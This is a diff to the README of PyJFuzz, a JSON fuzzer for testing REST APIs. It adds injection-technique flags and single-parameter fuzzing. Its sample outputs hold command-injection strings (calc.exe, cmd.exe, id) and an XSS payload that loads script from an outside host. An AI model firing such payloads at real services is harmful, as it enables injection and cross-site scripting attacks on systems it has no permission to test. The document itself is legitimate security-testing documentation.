@@ -13,13 +13,25 @@ PyJFuzz simplify the task to fuzz rest API web server since it's a commandline u
 ## Usage
 
 ```
-usage: pyjfuzz.py [-h] -j JSON [-f FUZZ_FACTOR] [-i INDENT] [-ue]
+PyJFuzz v0.2 - Daniele 'dzonerzy' Linguaglossa - danielelinguaglossa@gmail.com
+usage: pyjfuzz.py [-h] -j JSON [-p PARAMS] [-t TECHNIQUES] [-f FUZZ_FACTOR]
+                  [-i INDENT] [-ue]
 
 Trivial Python JSON Fuzzer (c) DZONERZY
 
 optional arguments:
   -h, --help      show this help message and exit
   -j JSON         Original JSON serialized object
+  -p PARAMS       Parameters comma separated
+  -t TECHNIQUES   Techniques "CHPTSX"
+
+                  C - Command Execution
+                  H - Header Injection
+                  P - Path Traversal
+                  T - Template Injection
+                  S - SQLInjection
+                  X - XSS
+
   -f FUZZ_FACTOR  Fuzz factor [0-6]
   -i INDENT       JSON indent number
   -ue             URLEncode result
@@ -115,6 +127,31 @@ dzonerzy:jsonfuzz dzonerzy$ python pyjfuzz.py -j '{"a": 1, "b": "2"}' -f 6 -i 3
    "b": {
       "param": "||calc.exe;&&id|1\\x0a||calc.exe;&&id|1\\x0a||calc.exexe;&&id|1\\x0a||calcalc.exe;&&id|2\\x0a||calc.exe;&&id|1\\x0a||calc.exe;&&id|1\\x0a|{calc.exe;&&id|2\\x0a"
    }
+}
+```
+## Single parameter fuzzing
+Using the **-p** switch you will be able to fuzz just one or more parameters!
+```
+dzonerzy:~ dzonerzy$ pyjfuzz.py -j '{"ciao": 1, "test": "a", "pluto": 1}' -t C -f 2 -p test -i 5
+PyJFuzz v0.2 - Daniele 'dzonerzy' Linguaglossa - danielelinguaglossa@gmail.com
+[INFO] Using (Radamsa 0.3)
+
+{
+     "ciao": 1,
+     "pluto": 1,
+     "test": "|||cmd.exe&&id|a\u000a;||cmd|cmd.exe&&&id||a\u000a;||cmd.exe&&id||a\u000a;"
+}
+```
+Or
+```
+dzonerzy:~ dzonerzy$ pyjfuzz.py -j '{"ciao": 1, "test": "a", "pluto": 1}' -t X -f 6 -p test,ciao -i 5
+PyJFuzz v0.2 - Daniele 'dzonerzy' Linguaglossa - danielelinguaglossa@gmail.com
+[INFO] Using (Radamsa 0.3)
+
+{
+     "ciao": -749870828,
+     "pluto": 1,
+     "test": "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack,s.src=(/,/+/a.net/).slice(2),document.documentElement.appendChild(s))//'>\u000a;</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/a.net/).slice(2),document.documentElement.appendChild(s))//'>\u000a;"
 }
 ```
 ## Using as a module
